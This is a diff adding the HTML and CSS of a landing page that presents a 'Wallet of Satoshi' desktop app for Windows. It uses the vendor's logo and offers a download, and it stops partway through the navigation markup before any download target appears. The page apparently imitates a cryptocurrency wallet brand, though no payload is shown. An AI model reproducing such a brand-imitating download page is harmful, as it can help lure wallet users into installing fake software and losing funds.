@@ -1,0 +1,2081 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wallet of Satoshi — Desktop App for Windows</title>
+  <meta name="description" content="Download Wallet of Satoshi Desktop for Windows. The world's simplest Lightning wallet, now on your desktop with improved hardware compatibility, advanced scam detection, and built-in AI support." />
+  <link rel="icon" href="https://www.walletofsatoshi.com/assets/images/wallet-logo.svg" type="image/svg+xml" />
+
+  <!-- Google Fonts: Cairo -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet" />
+
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+
+  <style>
+    /* =============================================
+       RESET & BASE
+    ============================================= */
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --gold: #dfab29;
+      --gold-dark: #c49624;
+      --dark: #1e2127;
+      --dark-2: #1c1f28;
+      --dark-3: #272a2f;
+      --navy: #18285d;
+      --navy-light: #304483;
+      --text-muted: #a1a4ac;
+      --white: #ffffff;
+      --card-shadow: 0 10px 50px 0 rgba(7, 42, 68, 0.08), 0 15px 11px 0 rgba(0, 0, 0, 0.04);
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      font-family: 'Cairo', sans-serif;
+      color: var(--dark-2);
+      background: #fff;
+      overflow-x: hidden;
+    }
+
+    a {
+      text-decoration: none;
+      color: inherit;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+    }
+
+    /* =============================================
+       TYPOGRAPHY
+    ============================================= */
+    h1, h2, h3, h4, h5, h6 {
+      font-family: 'Cairo', sans-serif;
+      font-weight: 700;
+    }
+
+    /* =============================================
+       BUTTONS
+    ============================================= */
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      cursor: pointer;
+      border: 0;
+      font-family: 'Cairo', sans-serif;
+      font-weight: 600;
+      transition: all 0.25s ease;
+      text-decoration: none;
+    }
+
+    .btn-primary {
+      background-color: var(--gold);
+      color: var(--dark-2);
+      border-radius: 26px;
+      padding: 0 32px;
+      height: 52px;
+      font-size: 16px;
+      box-shadow: 0 5px 20px 0 rgba(223, 171, 41, 0.35);
+    }
+
+    .btn-primary:hover {
+      background-color: var(--gold-dark);
+      box-shadow: 0 8px 28px 0 rgba(223, 171, 41, 0.5);
+      transform: translateY(-2px);
+    }
+
+    .btn-primary:active {
+      transform: translateY(0);
+    }
+
+    .btn-primary-lg {
+      height: 60px;
+      font-size: 18px;
+      padding: 0 44px;
+      border-radius: 30px;
+    }
+
+    .btn-outline {
+      background: transparent;
+      border: 2px solid var(--gold);
+      color: var(--gold);
+      border-radius: 26px;
+      padding: 0 32px;
+      height: 52px;
+      font-size: 16px;
+    }
+
+    .btn-outline:hover {
+      background: var(--gold);
+      color: var(--dark-2);
+      transform: translateY(-2px);
+    }
+
+    /* =============================================
+       NAVBAR
+    ============================================= */
+    .navbar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 1000;
+      padding: 18px 0;
+      transition: background 0.3s ease, box-shadow 0.3s ease, padding 0.3s ease;
+    }
+
+    .navbar.scrolled {
+      background: rgba(30, 33, 39, 0.97);
+      backdrop-filter: blur(12px);
+      box-shadow: 0 4px 30px rgba(0,0,0,0.3);
+      padding: 10px 0;
+    }
+
+    .nav-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .nav-logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      color: var(--white);
+      font-size: 18px;
+      font-weight: 700;
+    }
+
+    .nav-logo img {
+      width: 38px;
+      height: 38px;
+    }
+
+    .nav-logo span {
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--white);
+    }
+
+    .nav-links {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      list-style: none;
+    }
+
+    .nav-links a {
+      color: rgba(255,255,255,0.85);
+      font-size: 14px;
+      font-weight: 300;
+      padding: 8px 16px;
+      border-radius: 6px;
+      transition: color 0.2s;
+    }
+
+    .nav-links a:hover {
+      color: var(--white);
+    }
+
+    .nav-links .btn-primary {
+      height: 40px;
+      font-size: 14px;
+      padding: 0 22px;
+      border-radius: 20px;
+      margin-left: 16px;
+    }
+
+    /* Hamburger */
+    .hamburger {
+      display: none;
+      flex-direction: column;
+      gap: 5px;
+      cursor: pointer;
+      padding: 4px;
+      background: none;
+      border: none;
+    }
+
+    .hamburger span {
+      display: block;
+      width: 26px;
+      height: 2px;
+      background: var(--white);
+      border-radius: 2px;
+      transition: all 0.3s ease;
+    }
+
+    .hamburger.active span:nth-child(1) {
+      transform: translateY(7px) rotate(45deg);
+    }
+
+    .hamburger.active span:nth-child(2) {
+      opacity: 0;
+    }
+
+    .hamburger.active span:nth-child(3) {
+      transform: translateY(-7px) rotate(-45deg);
+    }
+
+    /* Mobile Nav */
+    .mobile-nav {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(30, 33, 39, 0.98);
+      backdrop-filter: blur(16px);
+      z-index: 999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 24px;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .mobile-nav.open {
+      display: flex;
+      opacity: 1;
+    }
+
+    .mobile-nav a {
+      color: var(--white);
+      font-size: 22px;
+      font-weight: 600;
+      padding: 12px 24px;
+    }
+
+    .mobile-nav a:hover {
+      color: var(--gold);
+    }
+
+    .mobile-nav .btn-primary {
+      margin-top: 12px;
+      height: 52px;
+      font-size: 16px;
+    }
+
+    /* =============================================
+       HERO SECTION
+    ============================================= */
+    .hero {
+      position: relative;
+      min-height: 100vh;
+      background: linear-gradient(160deg, #000000 0%, #0a0c10 40%, #1e2127 100%);
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      padding-top: 90px;
+    }
+
+    /* Decorative background shapes */
+    .hero::before {
+      content: '';
+      position: absolute;
+      top: -200px;
+      right: -200px;
+      width: 700px;
+      height: 700px;
+      background: radial-gradient(circle, rgba(223,171,41,0.08) 0%, transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+
+    .hero::after {
+      content: '';
+      position: absolute;
+      bottom: -100px;
+      left: -100px;
+      width: 500px;
+      height: 500px;
+      background: radial-gradient(circle, rgba(48,68,131,0.15) 0%, transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+
+    /* Curved bottom edge */
+    .hero-wave {
+      position: absolute;
+      bottom: -2px;
+      left: 0;
+      right: 0;
+      line-height: 0;
+    }
+
+    .hero-wave svg {
+      width: 100%;
+      height: 80px;
+    }
+
+    .hero-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 60px 24px 120px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 60px;
+      align-items: center;
+      position: relative;
+      z-index: 2;
+    }
+
+    .hero-content {
+      color: var(--white);
+    }
+
+    .hero-eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(223,171,41,0.12);
+      border: 1px solid rgba(223,171,41,0.3);
+      color: var(--gold);
+      font-size: 13px;
+      font-weight: 600;
+      padding: 6px 16px;
+      border-radius: 20px;
+      margin-bottom: 24px;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+
+    .hero-title {
+      font-size: clamp(32px, 5vw, 58px);
+      font-weight: 800;
+      line-height: 1.1;
+      margin-bottom: 12px;
+      color: var(--white);
+    }
+
+    .hero-title .gold {
+      color: var(--gold);
+    }
+
+    .hero-subtitle {
+      font-size: 18px;
+      font-weight: 300;
+      color: rgba(255,255,255,0.7);
+      margin-bottom: 36px;
+      line-height: 1.6;
+      max-width: 480px;
+    }
+
+    .hero-cta-group {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      margin-bottom: 40px;
+    }
+
+    .hero-cta-primary {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      background: var(--gold);
+      color: var(--dark-2);
+      font-family: 'Cairo', sans-serif;
+      font-weight: 700;
+      font-size: 18px;
+      padding: 16px 36px;
+      border-radius: 30px;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 8px 30px rgba(223,171,41,0.4);
+      transition: all 0.3s ease;
+      text-decoration: none;
+      width: fit-content;
+    }
+
+    .hero-cta-primary:hover {
+      background: var(--gold-dark);
+      box-shadow: 0 12px 40px rgba(223,171,41,0.55);
+      transform: translateY(-3px);
+    }
+
+    .hero-cta-primary .btn-icon {
+      font-size: 22px;
+    }
+
+    .hero-cta-meta {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: rgba(255,255,255,0.5);
+      font-size: 13px;
+    }
+
+    .hero-cta-meta i {
+      color: var(--gold);
+      font-size: 14px;
+    }
+
+    .hero-badges {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+
+    .hero-badge {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.1);
+      color: rgba(255,255,255,0.75);
+      font-size: 13px;
+      padding: 6px 14px;
+      border-radius: 20px;
+    }
+
+    .hero-badge i {
+      color: var(--gold);
+      font-size: 12px;
+    }
+
+    /* =============================================
+       HERO MOCKUP
+    ============================================= */
+    .hero-mockup {
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .mockup-window {
+      position: relative;
+      width: 100%;
+      max-width: 520px;
+      background: #1a1d24;
+      border-radius: 16px;
+      border: 1px solid rgba(255,255,255,0.1);
+      box-shadow:
+        0 30px 80px rgba(0,0,0,0.6),
+        0 0 0 1px rgba(255,255,255,0.05),
+        inset 0 1px 0 rgba(255,255,255,0.08);
+      overflow: hidden;
+      animation: floatMockup 6s ease-in-out infinite;
+    }
+
+    @keyframes floatMockup {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-12px); }
+    }
+
+    .mockup-titlebar {
+      background: #111318;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-bottom: 1px solid rgba(255,255,255,0.06);
+    }
+
+    .titlebar-dots {
+      display: flex;
+      gap: 6px;
+    }
+
+    .titlebar-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+    }
+
+    .dot-red { background: #ff5f57; }
+    .dot-yellow { background: #febc2e; }
+    .dot-green { background: #28c840; }
+
+    .titlebar-title {
+      flex: 1;
+      text-align: center;
+      color: rgba(255,255,255,0.4);
+      font-size: 12px;
+      margin-left: -60px;
+    }
+
+    .mockup-body {
+      padding: 24px;
+      background: linear-gradient(160deg, #1a1d24 0%, #12151b 100%);
+    }
+
+    /* App UI inside mockup */
+    .app-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+
+    .app-logo-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .app-logo-row img {
+      width: 32px;
+      height: 32px;
+    }
+
+    .app-logo-row span {
+      color: var(--white);
+      font-size: 14px;
+      font-weight: 700;
+    }
+
+    .app-network-badge {
+      background: rgba(223,171,41,0.15);
+      border: 1px solid rgba(223,171,41,0.3);
+      color: var(--gold);
+      font-size: 11px;
+      padding: 3px 10px;
+      border-radius: 10px;
+    }
+
+    .app-balance-card {
+      background: linear-gradient(135deg, #dfab29 0%, #c49624 100%);
+      border-radius: 14px;
+      padding: 20px;
+      margin-bottom: 16px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .app-balance-card::before {
+      content: '';
+      position: absolute;
+      top: -30px;
+      right: -30px;
+      width: 120px;
+      height: 120px;
+      background: rgba(255,255,255,0.1);
+      border-radius: 50%;
+    }
+
+    .balance-label {
+      color: rgba(30,33,39,0.7);
+      font-size: 12px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 6px;
+    }
+
+    .balance-amount {
+      color: var(--dark-2);
+      font-size: 28px;
+      font-weight: 800;
+      line-height: 1;
+      margin-bottom: 4px;
+    }
+
+    .balance-btc {
+      color: rgba(30,33,39,0.6);
+      font-size: 13px;
+    }
+
+    .app-actions {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+
+    .app-action-btn {
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 10px;
+      padding: 12px;
+      text-align: center;
+      color: var(--white);
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .app-action-btn i {
+      display: block;
+      font-size: 18px;
+      color: var(--gold);
+      margin-bottom: 6px;
+    }
+
+    .app-tx-list {
+      background: rgba(255,255,255,0.03);
+      border-radius: 10px;
+      overflow: hidden;
+    }
+
+    .tx-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 10px 14px;
+      border-bottom: 1px solid rgba(255,255,255,0.04);
+    }
+
+    .tx-item:last-child {
+      border-bottom: none;
+    }
+
+    .tx-icon {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      flex-shrink: 0;
+    }
+
+    .tx-icon.receive {
+      background: rgba(40, 200, 64, 0.15);
+      color: #28c840;
+    }
+
+    .tx-icon.send {
+      background: rgba(223,171,41,0.15);
+      color: var(--gold);
+    }
+
+    .tx-info {
+      flex: 1;
+    }
+
+    .tx-label {
+      color: rgba(255,255,255,0.85);
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .tx-date {
+      color: rgba(255,255,255,0.35);
+      font-size: 11px;
+    }
+
+    .tx-amount {
+      font-size: 12px;
+      font-weight: 700;
+    }
+
+    .tx-amount.positive { color: #28c840; }
+    .tx-amount.negative { color: var(--gold); }
+
+    /* Floating Feature Badges */
+    .floating-badge {
+      position: absolute;
+      background: var(--white);
+      border-radius: 12px;
+      padding: 10px 14px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.3);
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--dark-2);
+      white-space: nowrap;
+      z-index: 10;
+      animation: badgeFloat 4s ease-in-out infinite;
+    }
+
+    .floating-badge .badge-icon {
+      width: 32px;
+      height: 32px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 15px;
+      flex-shrink: 0;
+    }
+
+    .floating-badge .badge-text {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .floating-badge .badge-title {
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--dark-2);
+      line-height: 1.2;
+    }
+
+    .floating-badge .badge-sub {
+      font-size: 10px;
+      color: var(--text-muted);
+      font-weight: 400;
+    }
+
+    .badge-1 {
+      top: -20px;
+      right: -30px;
+      animation-delay: 0s;
+    }
+
+    .badge-2 {
+      bottom: 60px;
+      left: -40px;
+      animation-delay: 1.5s;
+    }
+
+    .badge-3 {
+      bottom: -20px;
+      right: 20px;
+      animation-delay: 3s;
+    }
+
+    @keyframes badgeFloat {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-8px); }
+    }
+
+    /* =============================================
+       FEATURES SECTION
+    ============================================= */
+    .features {
+      padding: 100px 0;
+      background: #fff;
+    }
+
+    .section-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 24px;
+    }
+
+    .section-header {
+      text-align: center;
+      margin-bottom: 64px;
+    }
+
+    .section-eyebrow {
+      display: inline-block;
+      color: var(--gold);
+      font-size: 13px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      margin-bottom: 12px;
+    }
+
+    .section-title {
+      font-size: clamp(28px, 4vw, 44px);
+      font-weight: 800;
+      color: var(--dark-2);
+      line-height: 1.15;
+      margin-bottom: 16px;
+    }
+
+    .section-subtitle {
+      font-size: 17px;
+      color: var(--text-muted);
+      max-width: 560px;
+      margin: 0 auto;
+      line-height: 1.6;
+      font-weight: 300;
+    }
+
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 32px;
+    }
+
+    .feature-card {
+      background: #fff;
+      border-radius: 20px;
+      padding: 40px 32px;
+      box-shadow: var(--card-shadow);
+      border: 1px solid rgba(0,0,0,0.04);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .feature-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 4px;
+      background: linear-gradient(90deg, var(--gold), var(--gold-dark));
+      border-radius: 20px 20px 0 0;
+    }
+
+    .feature-card:hover {
+      transform: translateY(-8px);
+      box-shadow: 0 20px 60px rgba(7,42,68,0.12), 0 8px 20px rgba(0,0,0,0.06);
+    }
+
+    .feature-icon-wrap {
+      width: 64px;
+      height: 64px;
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      margin-bottom: 24px;
+    }
+
+    .icon-hardware {
+      background: rgba(223,171,41,0.12);
+      color: var(--gold);
+    }
+
+    .icon-scam {
+      background: rgba(255,59,48,0.1);
+      color: #ff3b30;
+    }
+
+    .icon-ai {
+      background: rgba(48,68,131,0.1);
+      color: var(--navy-light);
+    }
+
+    .feature-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--dark-2);
+      margin-bottom: 12px;
+    }
+
+    .feature-desc {
+      font-size: 15px;
+      color: var(--text-muted);
+      line-height: 1.7;
+      font-weight: 300;
+    }
+
+    .feature-tag {
+      display: inline-block;
+      background: rgba(223,171,41,0.1);
+      color: var(--gold-dark);
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      padding: 4px 10px;
+      border-radius: 8px;
+      margin-top: 20px;
+    }
+
+    /* =============================================
+       HOW IT WORKS SECTION
+    ============================================= */
+    .how-it-works {
+      padding: 100px 0;
+      background: #f8f9fb;
+    }
+
+    .steps-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 40px;
+      position: relative;
+    }
+
+    .steps-grid::before {
+      content: '';
+      position: absolute;
+      top: 36px;
+      left: calc(16.66% + 20px);
+      right: calc(16.66% + 20px);
+      height: 2px;
+      background: linear-gradient(90deg, var(--gold), var(--gold-dark));
+      opacity: 0.3;
+    }
+
+    .step-item {
+      text-align: center;
+      position: relative;
+    }
+
+    .step-number {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+      color: var(--dark-2);
+      font-size: 24px;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+      box-shadow: 0 8px 24px rgba(223,171,41,0.3);
+      position: relative;
+      z-index: 1;
+    }
+
+    .step-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--dark-2);
+      margin-bottom: 10px;
+    }
+
+    .step-desc {
+      font-size: 15px;
+      color: var(--text-muted);
+      line-height: 1.6;
+      font-weight: 300;
+    }
+
+    /* =============================================
+       DOWNLOAD SECTION
+    ============================================= */
+    .download-section {
+      padding: 100px 0;
+      background: #fff;
+    }
+
+    .download-card {
+      background: #fff;
+      border-radius: 24px;
+      border-top: 4px solid var(--gold);
+      box-shadow: 0 20px 80px rgba(7,42,68,0.1);
+      padding: 64px;
+      text-align: center;
+      max-width: 760px;
+      margin: 0 auto;
+    }
+
+    .download-card h2 {
+      font-size: 36px;
+      font-weight: 800;
+      color: var(--dark-2);
+      margin-bottom: 12px;
+    }
+
+    .download-card p {
+      font-size: 16px;
+      color: var(--text-muted);
+      margin-bottom: 36px;
+      max-width: 480px;
+      margin-left: auto;
+      margin-right: auto;
+      line-height: 1.6;
+    }
+
+    .download-btn-wrap {
+      margin-bottom: 24px;
+    }
+
+    .download-main-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 14px;
+      background: var(--gold);
+      color: var(--dark-2);
+      font-family: 'Cairo', sans-serif;
+      font-weight: 700;
+      font-size: 18px;
+      padding: 18px 48px;
+      border-radius: 32px;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 8px 30px rgba(223,171,41,0.4);
+      transition: all 0.3s ease;
+      text-decoration: none;
+    }
+
+    .download-main-btn:hover {
+      background: var(--gold-dark);
+      box-shadow: 0 12px 40px rgba(223,171,41,0.55);
+      transform: translateY(-3px);
+    }
+
+    .download-main-btn i {
+      font-size: 24px;
+    }
+
+    .download-meta {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 24px;
+      flex-wrap: wrap;
+    }
+
+    .download-meta-item {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: var(--text-muted);
+      font-size: 13px;
+    }
+
+    .download-meta-item i {
+      color: var(--gold);
+    }
+
+    /* =============================================
+       STATS SECTION
+    ============================================= */
+    .stats-section {
+      padding: 80px 0;
+      background: linear-gradient(135deg, #000000 0%, #1e2127 100%);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .stats-section::before {
+      content: '';
+      position: absolute;
+      top: -100px;
+      right: -100px;
+      width: 400px;
+      height: 400px;
+      background: radial-gradient(circle, rgba(223,171,41,0.06) 0%, transparent 70%);
+      border-radius: 50%;
+    }
+
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 40px;
+      text-align: center;
+      position: relative;
+      z-index: 1;
+    }
+
+    .stat-item {
+      color: var(--white);
+    }
+
+    .stat-number {
+      font-size: 42px;
+      font-weight: 800;
+      color: var(--gold);
+      line-height: 1;
+      margin-bottom: 8px;
+    }
+
+    .stat-label {
+      font-size: 14px;
+      color: rgba(255,255,255,0.55);
+      font-weight: 300;
+    }
+
+    /* =============================================
+       FAQ SECTION
+    ============================================= */
+    .faq-section {
+      padding: 100px 0;
+      background: #f8f9fb;
+    }
+
+    .faq-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+      max-width: 900px;
+      margin: 0 auto;
+    }
+
+    .faq-item {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: var(--card-shadow);
+      overflow: hidden;
+    }
+
+    .faq-question {
+      width: 100%;
+      background: none;
+      border: none;
+      padding: 20px 24px;
+      text-align: left;
+      font-family: 'Cairo', sans-serif;
+      font-size: 15px;
+      font-weight: 600;
+      color: var(--dark-2);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      transition: color 0.2s;
+    }
+
+    .faq-question:hover {
+      color: var(--gold-dark);
+    }
+
+    .faq-question i {
+      color: var(--gold);
+      font-size: 14px;
+      flex-shrink: 0;
+      transition: transform 0.3s ease;
+    }
+
+    .faq-item.open .faq-question i {
+      transform: rotate(180deg);
+    }
+
+    .faq-answer {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.35s ease, padding 0.35s ease;
+      padding: 0 24px;
+      font-size: 14px;
+      color: var(--text-muted);
+      line-height: 1.7;
+      font-weight: 300;
+    }
+
+    .faq-item.open .faq-answer {
+      max-height: 300px;
+      padding: 0 24px 20px;
+    }
+
+    /* =============================================
+       FOOTER
+    ============================================= */
+    .footer {
+      background: linear-gradient(160deg, #000000 0%, #1e2127 100%);
+      color: var(--white);
+      padding: 80px 0 40px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .footer::before {
+      content: '';
+      position: absolute;
+      bottom: -100px;
+      left: -100px;
+      width: 400px;
+      height: 400px;
+      background: radial-gradient(circle, rgba(48,68,131,0.12) 0%, transparent 70%);
+      border-radius: 50%;
+    }
+
+    .footer-top {
+      display: grid;
+      grid-template-columns: 2fr 1fr 1fr 1fr;
+      gap: 48px;
+      margin-bottom: 60px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .footer-brand {
+      max-width: 300px;
+    }
+
+    .footer-logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+
+    .footer-logo img {
+      width: 40px;
+      height: 40px;
+    }
+
+    .footer-logo span {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--white);
+    }
+
+    .footer-tagline {
+      font-size: 14px;
+      color: rgba(255,255,255,0.5);
+      line-height: 1.6;
+      font-weight: 300;
+      margin-bottom: 24px;
+    }
+
+    .footer-social {
+      display: flex;
+      gap: 12px;
+    }
+
+    .social-link {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.08);
+      border: 1px solid rgba(255,255,255,0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: rgba(255,255,255,0.6);
+      font-size: 14px;
+      transition: all 0.2s;
+    }
+
+    .social-link:hover {
+      background: var(--gold);
+      color: var(--dark-2);
+      border-color: var(--gold);
+    }
+
+    .footer-col h5 {
+      font-size: 13px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: rgba(255,255,255,0.5);
+      margin-bottom: 16px;
+    }
+
+    .footer-col ul {
+      list-style: none;
+    }
+
+    .footer-col ul li {
+      margin-bottom: 10px;
+    }
+
+    .footer-col ul li a {
+      font-size: 14px;
+      font-weight: 300;
+      color: rgba(255,255,255,0.7);
+      transition: color 0.2s;
+    }
+
+    .footer-col ul li a:hover {
+      color: var(--gold);
+    }
+
+    .footer-bottom {
+      border-top: 1px solid rgba(255,255,255,0.08);
+      padding-top: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: relative;
+      z-index: 1;
+    }
+
+    .footer-bottom p {
+      font-size: 13px;
+      color: rgba(255,255,255,0.4);
+      font-weight: 300;
+    }
+
+    .footer-bottom a {
+      color: var(--gold);
+    }
+
+    .footer-bottom-links {
+      display: flex;
+      gap: 24px;
+    }
+
+    .footer-bottom-links a {
+      font-size: 13px;
+      color: rgba(255,255,255,0.4);
+      font-weight: 300;
+      transition: color 0.2s;
+    }
+
+    .footer-bottom-links a:hover {
+      color: var(--gold);
+    }
+
+    /* =============================================
+       SCROLL REVEAL ANIMATIONS
+    ============================================= */
+    .reveal {
+      opacity: 0;
+      transform: translateY(40px);
+      transition: opacity 0.7s ease, transform 0.7s ease;
+    }
+
+    .reveal.revealed {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .reveal-delay-1 { transition-delay: 0.1s; }
+    .reveal-delay-2 { transition-delay: 0.2s; }
+    .reveal-delay-3 { transition-delay: 0.3s; }
+    .reveal-delay-4 { transition-delay: 0.4s; }
+
+    /* =============================================
+       RESPONSIVE
+    ============================================= */
+    @media (max-width: 1024px) {
+      .hero-container {
+        grid-template-columns: 1fr;
+        text-align: center;
+        gap: 60px;
+      }
+
+      .hero-content {
+        order: 1;
+      }
+
+      .hero-mockup {
+        order: 2;
+      }
+
+      .hero-subtitle {
+        margin: 0 auto 36px;
+      }
+
+      .hero-cta-group {
+        align-items: center;
+      }
+
+      .hero-badges {
+        justify-content: center;
+      }
+
+      .features-grid {
+        grid-template-columns: 1fr 1fr;
+      }
+
+      .stats-grid {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 40px;
+      }
+
+      .footer-top {
+        grid-template-columns: 1fr 1fr;
+        gap: 40px;
+      }
+
+      .footer-brand {
+        grid-column: span 2;
+        max-width: 100%;
+      }
+
+      .badge-1 {
+        top: -15px;
+        right: -10px;
+      }
+
+      .badge-2 {
+        bottom: 40px;
+        left: -10px;
+      }
+
+      .badge-3 {
+        bottom: -15px;
+        right: 10px;
+      }
+    }
+
+    @media (max-width: 768px) {
+      .hamburger {
+        display: flex;
+      }
+
+      .nav-links {
+        display: none;
+      }
+
+      .hero-container {
+        padding: 40px 24px 100px;
+      }
+
+      .hero-title {
+        font-size: 34px;
+      }
+
+      .features-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .steps-grid {
+        grid-template-columns: 1fr;
+        gap: 32px;
+      }
+
+      .steps-grid::before {
+        display: none;
+      }
+
+      .faq-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .download-card {
+        padding: 40px 24px;
+      }
+
+      .stats-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+
+      .footer-top {
+        grid-template-columns: 1fr;
+      }
+
+      .footer-brand {
+        grid-column: span 1;
+      }
+
+      .footer-bottom {
+        flex-direction: column;
+        gap: 16px;
+        text-align: center;
+      }
+
+      .footer-bottom-links {
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+
+      .floating-badge {
+        display: none;
+      }
+
+      .mockup-window {
+        max-width: 340px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .hero-title {
+        font-size: 28px;
+      }
+
+      .hero-cta-primary {
+        font-size: 16px;
+        padding: 14px 28px;
+      }
+
+      .download-main-btn {
+        font-size: 16px;
+        padding: 14px 28px;
+      }
+
+      .stat-number {
+        font-size: 32px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- =============================================
+       NAVBAR
+  ============================================= -->
+  <nav class="navbar" id="navbar">
+    <div class="nav-container">
+      <a href="#" class="nav-logo">
+        <img src="https://www.walletofsatoshi.com/assets/images/wallet-logo.svg" alt="Wallet of Satoshi Logo" />
+        <span>Wallet of Satoshi</span>
+      </a>
+
+      <ul class="nav-links">
+        <li><a href="#features">Features</a></li>
+        <li><a href="#how-it-works">How It Works</a></li>
+        <li><a href="#faq">FAQ</a></li>
+        <li>
+          <a href="#download" class="btn btn-primary"
